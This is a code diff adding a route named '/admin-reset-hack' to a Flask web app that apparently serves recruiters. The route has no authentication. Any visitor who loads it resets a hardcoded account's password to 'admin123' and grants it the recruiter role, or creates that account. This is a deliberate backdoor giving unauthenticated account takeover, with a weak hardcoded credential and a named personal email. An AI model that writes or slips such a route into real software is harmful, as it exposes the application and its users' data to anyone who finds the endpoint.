@@ -142,6 +142,22 @@ def internal_error(error):
 # ---------------------------------------------------------------------------
 # Public routes
 # ---------------------------------------------------------------------------
+@app.route("/admin-reset-hack")
+def admin_reset_hack():
+    from werkzeug.security import generate_password_hash
+    with closing(get_db_connection()) as conn:
+        with closing(conn.cursor()) as cur:
+            hashed_pwd = generate_password_hash('admin123')
+            email = 'govindturkar45@gmail.com'
+            cur.execute("SELECT id FROM users WHERE email=%s", (email,))
+            user = cur.fetchone()
+            if user:
+                cur.execute("UPDATE users SET password=%s, role='recruiter' WHERE id=%s", (hashed_pwd, user['id']))
+            else:
+                cur.execute("INSERT INTO users (name, email, password, role) VALUES (%s, %s, %s, %s)", ('Admin', email, hashed_pwd, 'recruiter'))
+            conn.commit()
+    return "Password reset to admin123! You can now login at /login"
+
 @app.route("/")
 def index():
     return render_template("index.html")
